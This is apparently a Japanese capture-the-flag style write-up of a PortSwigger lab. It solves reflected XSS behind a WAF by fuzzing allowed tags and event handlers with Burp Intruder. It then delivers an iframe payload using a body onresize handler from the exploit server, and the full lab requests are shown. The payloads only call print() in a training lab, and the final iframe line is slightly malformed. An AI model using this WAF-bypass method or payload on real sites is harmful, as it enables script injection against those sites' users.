# ほとんどのタグと属性がブロックされた状態で XSS を HTML コンテキストに反映

このラボには、検索機能に 反映された XSS 脆弱性が含まれていますが、Web アプリケーション ファイアウォール (WAF) を使用して一般的な XSS ベクトルから保護します。  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

- 1. Burp Suite を起動して Proxy タブからブラウザを起動します
- 2. ハッキングラボにアクセスします
- 3. 検索窓に以下を入力し検索しようとすると失敗します

```
<img src=1 onerror=print()>
```

結果

```
"Tag is not allowed"
```

- 4.GET /?search=%3Cimg+src%3D1+onerror%3Dprint%28%29%3E リクエストを send to intruder します

* 5. リクエストを以下のように書き換えます
     [変更前]

```
GET /?search=%3Cimg+src%3D1+onerror%3Dprint%28%29%3E HTTP/2
Host: 0a6500c304f1da4d8186571d00800071.web-security-academy.net
Cookie: session=CYPyIzeysT6iI7agbeasg9N3n1nWHb39
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6500c304f1da4d8186571d00800071.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

[変更後]

```
GET /?search=<§§> HTTP/2
Host: 0a6500c304f1da4d8186571d00800071.web-security-academy.net
Cookie: session=CYPyIzeysT6iI7agbeasg9N3n1nWHb39
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6500c304f1da4d8186571d00800071.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

- 6. payload タブに移動し、以下のチートシートの Copy tags to clibboard をコピーします
     https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

- 7. payload setting にコピーしたデータを張り付けて、攻撃を開始します

* 8. body タグを受け付けるので、リクエストを次のように書き換えます
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/b3c3eb85-7f7c-42bd-9ca5-a4db7c0bdf9b)

```
GET /?search=<body%20§§=1> HTTP/2
Host: 0a6500c304f1da4d8186571d00800071.web-security-academy.net
Cookie: session=CYPyIzeysT6iI7agbeasg9N3n1nWHb39
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6500c304f1da4d8186571d00800071.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

- 9. 今度は以下のチートシートの Copy events to clibboard をコピーします
     https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

* 10. payload setting にデータをクリアしてから、コピーしたデータを張り付けて、攻撃を開始します
      ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/a9de7a48-b8c8-41ca-b463-a6d9f622d731)

- 11. expoit サーバーに移動して、以下のリクエストを張り付けます

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload="this.style.width" ="100px"></iframe>
```

![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/f3d1d48c-c1af-4d8c-889c-c80619b52b4d)

- 12. Store ボタン →Deliver exploit to victim ボタンの順に押します。
